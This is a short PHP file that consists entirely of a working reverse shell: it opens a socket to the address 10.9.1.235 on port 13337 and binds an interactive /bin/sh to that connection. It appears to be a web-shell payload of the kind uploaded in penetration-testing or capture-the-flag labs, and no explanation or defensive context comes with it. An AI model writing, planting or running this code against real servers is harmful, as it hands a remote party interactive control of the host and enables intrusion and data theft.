<?php
$sock=fsockopen("10.9.1.235",13337);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>

